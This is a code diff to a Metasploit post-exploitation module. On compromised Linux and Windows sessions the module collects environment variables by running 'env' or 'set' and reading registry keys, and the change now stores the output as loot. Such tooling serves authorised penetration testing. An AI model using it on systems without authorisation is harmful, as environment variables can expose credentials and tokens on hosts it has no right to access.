@@ -27,6 +27,7 @@ class Metasploit3 < Msf::Post
 			'Platform'      => [ 'linux', 'windows' ],
 			'SessionTypes'  => [ 'shell', 'meterpreter' ]
 		))
+		@ltype = 'generic.environment'
 	end
 
 	def run
@@ -36,21 +37,20 @@ class Metasploit3 < Msf::Post
 		when "meterpreter"
 			get_env_meterpreter
 		end
+		store_loot(@ltype, "text/plain", session, @output) if @output
+		print_line @output if @output
 	end
 
 	def get_env_shell
-		case session.platform
-		when /unix|linux|bsd|bsdi|aix|solaris/
-			output = session.shell_command_token("env")
-		when /windows/
-			output = session.shell_command_token("set")
+		print_line @output if @output
+		if session.platform =~ /win/
+			@ltype = "windows.environment"
+			cmd = "set"
 		else
-			# Don't know what it is, hope it's unix
-			if session.respond_to? :shell_command_token_unix
-				output = session.shell_command_token_unix("env")
-			end
+			@ltype = "unix.environment"
+			cmd = "env"
 		end
-		print_line output if output
+		@output = session.shell_command_token(cmd)
 	end
 
 	def get_env_meterpreter
@@ -60,14 +60,19 @@ class Metasploit3 < Msf::Post
 			var_names << registry_enumvals("HKEY_CURRENT_USER\\Volatile Environment")
 			var_names << registry_enumvals("HKEY_CURRENT_USER\\Environment")
 			var_names << registry_enumvals("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment")
+			output = []
 			var_names.flatten.uniq.sort.each do |v|
-				print_line "#{v}=#{session.fs.file.expand_path("\%#{v}\%")}"
+				# Emulate the output of set and env, e.g. VAR=VALUE
+				output << "#{v}=#{session.fs.file.expand_path("\%#{v}\%")}"
 			end
+			@output = output.join("\n")
+			@ltype = "windows.environment"
 		else
 			# Don't know what it is, hope it's unix
 			print_status sysinfo["OS"]
 			chan = session.sys.process.execute("/bin/sh", "-c env", {"Channelized" => true})
-			print_line chan.read
+			@output = chan.read
+			@ltype = "unix.environment"
 		end
 	end
 
